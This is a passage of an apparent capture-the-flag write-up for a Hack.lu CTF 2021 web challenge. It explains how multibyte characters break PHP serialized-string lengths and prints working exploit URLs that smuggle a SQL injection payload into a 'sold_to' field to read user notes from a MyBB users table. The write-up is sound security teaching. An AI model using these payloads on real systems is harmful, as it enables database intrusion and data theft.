+}</code></pre></div>
+<p>Although the keys other than <code>reliability</code>, <code>impact</code>, <code>current_bidding</code> and <code>sold_to</code> are not validated and will be added to the return object directly for serialization, only <code>sold_to</code> is shown to the user. It seemed that every other key except <code>sold_to</code> are not important because they do not affect the rendered result... or is it?</p>
+
+<p>These (un)serialization will use <code>_safe_unserialize</code> / <code>_safe_serialize</code>, which look safe (<del>as the name suggested lol</del>). Then how can we have a <code>sold_to</code> with SQLi payload after unserialize while bypassing the check during the serialization? Maybe there are some mutation when it writes to the database and reads differently afterwards. A typically case is data truncation in SQL, but the column data type here is <code>TEXT</code>, and also having a left substring of the serialized string seems not very helpful in crafting a nice payload that changes the <code>sold_to</code> later.</p>
+
+<p>Maybe it is about Multibyte character exploit? Sounds like the infamous <strong>許功蓋</strong> in the 90s. Just randomly add some characters from <code>[\x80-\xff]</code> and see what's going on:</p>
+<pre><code>http://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal&amp;additional_info[%ee]=1&amp;additional_info[sold_to]=1</code></pre>
+<p>This will make the buyer empty (instead of <em>Admin</em>), meaning it breaks the serialized string in some way.</p>
+
+<p>Then we observe what is the actual serialized string looks like for different cases:</p>
+
+<p><code>additional_info[e%ee]=1&amp;additional_info[sold_to]=1</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">a:2:{s:2:&#34;e?;s:1:&#34;1&#34;;s:7:&#34;sold_to&#34;;i:1;}</code></pre></div>
+<p><code>additional_info[%ee%ee]=1&amp;additional_info[sold_to]=1</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">a:2:{s:2:&#34;?&#34;;s:1:&#34;1&#34;;s:7:&#34;sold_to&#34;;i:1;}</code></pre></div>
+<p>As you can see, the length of first string is the number of bytes we entered but the output may contain something less than that. So basically we need to craft a serialized string that will unserialized to <code>Array(&quot;somejunk1&quot;=&gt;&quot;somejunk2&quot;,&quot;sold_to&quot;=&gt;&quot;payload&quot;)</code></p>
+
+<p>How? I don't know... Just do some trial and error. Before I finish crafting, <em>Mystiz</em> has already got a working payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal&amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ec]=%22;s:0:%22%22;s:7:%22sold_to%22;s:53:%22-1%20union%20select%20usernotes%20from%20mybb_users%20where%20uid=1&amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee]=1&amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ef]=2</code></pre></div>
+<p>which looks like</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">a:3:{s:8:&#34;?;s:82:&#34;&#34;;s:0:&#34;&#34;;s:7:&#34;sold_to&#34;;s:53:&#34;-1 union select usernotes from mybb_users where uid=1&#34;;s:15:&#34;????????;s:1:&#34;1&#34;;s:15:&#34;????????;s:1:&#34;2&#34;;}</code></pre></div>
+<p>Looks horrible isn't it? Somehow it includes the serialized string <code>s:7:&quot;sold_to&quot;;s:(some_number):&quot;some_payload&quot;</code> inside one of the input. I personally think that having that <code>s:53</code> is troublesome. Instead, I tried to have <code>;s:7:&quot;sold_to</code> as one of the key, and then the value and the value length should be generated automatically...</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal&amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%eex]=;s:6:&amp;additional_info[;s:7:%22sold_to]=payload</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">(What it interprets)
+K          *************                    *******
+V                              ******                     *******
+a:2:{s:13:&#34;???????&#34;;s:5:&#34;;s:6:&#34;;s:13:&#34;;s:7:&#34;sold_to&#34;;s:7:&#34;payload&#34;;}
+K          *******                    *************
+V                        *****                            *******
+(What I entered)</code></pre></div><div class="footnotes">
+
+<hr>
+
+<ol>
+<li id="fn:absolute-path-as-url">Mozilla (2021) &quot;HTTP Messages&quot;<br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages">https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages</a>
+ <a class="footnote-return" href="#fnref:absolute-path-as-url"><sup>[return]</sup></a></li>
+</ol>
+</div>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
+      <li><a href="https://b6a.black/tags/hacklu-ctf/">hacklu-ctf</a></li>
+      <li><a href="https://b6a.black/tags/web/">web</a></li>
+    </ul>
+    <nav class="paginav">
+      <a class="next" href="https://b6a.black/posts/2021-11-04-hacklu-crypto/">
+        <span class="title">Next Page »</span>
+        <br>
+        <span>Hack.lu CTF 2021 Crypto Writeup</span>
+      </a>
+    </nav>
+  </footer>
+</article>
+<aside class="toc-container">
+  <a href="#" style="text-decoration: none; font-weight: 700;">
+    Hack.lu CTF 2021 Web Writeup
+  </a>
+  <div class="js-toc"></div>
+</aside>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+    headingSelector: 'h1, h2, h3, h4',
+    orderedList: false,
+    headingLabelCallback: s => s.substr(0, s.length-1),
+    collapseDepth: 2
+  });
+</script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
+<script type="text/javascript">
+  (function () {
+    const vizPrefix = "language-viz-";
+    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
+      let engine;
+      x.getAttribute("class").split(" ").forEach(function (cls) {
+        if (cls.startsWith(vizPrefix)) {
+          engine = cls.substr(vizPrefix.length);
+        }
+      });
+      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
+      x.parentNode.insertBefore(image.documentElement, x);
+      x.style.display = 'none'
+      x.parentNode.style.backgroundColor = "white"
+    });
+  })();
+</script>
+    </main><footer class="footer">
+    <span>&copy; 2021 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&middot;</span>
+    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
+    <span>&middot;</span>
+    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
+
+
+
+<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+</script>
+
+</body>
+
+</html>
